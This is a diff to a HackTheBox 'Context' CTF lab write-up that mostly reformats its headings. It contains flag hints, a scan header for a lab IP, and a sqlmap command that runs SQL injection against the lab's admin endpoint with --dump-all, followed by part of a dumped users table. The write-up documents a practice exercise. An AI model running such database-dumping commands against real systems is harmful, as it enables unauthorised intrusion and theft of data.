@@ -1,4 +1,5 @@
-# Nmap
+# HackTheBox Fortress Context Writeup
+## Nmap
 ```
 Nmap scan report for 10.13.37.12
 Host is up, received user-set (0.20s latency).
@@ -98,13 +99,13 @@ PORT     STATE SERVICE       REASON          VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 ```
 
-# Flag 1 But we have SSL!?
+## Flag 1 But we have SSL!?
 
 
-# Flag 2 That shouldn't be there...
+## Flag 2 That shouldn't be there...
 view-source:https://10.13.37.12/Home/Staff
 
-# Flag 3 Have we met before?
+## Flag 3 Have we met before?
 ```bash
 sqlmap -u 'https://10.13.37.12:443/Admin/AddProduct' --data='name=1&price=1&creationYear=1&certified=1&__RequestVerificationToken=CfDJ8K9TQWNukZhLhmhij967A4N1qNy8yK6D_PYoKKWFzGhwu2T0AKBh7eORVPVQsIounQOjuK_T7V9FOQhn6N3I78_dsxykDdrBAbwYYoZ2VL5r3tVgXbqhYltG8CfWsYQd9E4Vpkunp1td9QFz4YeOWbg' --level=5 --risk=3 --dbms='Microsoft SQL Server ' --cookie='[...SNIP...]' --dump-all
 
@@ -134,6 +135,6 @@ Table: users
 +----+----------------------------------------+----------------+-----------+------------+
 ```
 
-# Flag 4 Is it a bird? Is it a plane?
+## Flag 4 Is it a bird? Is it a plane?
 
 
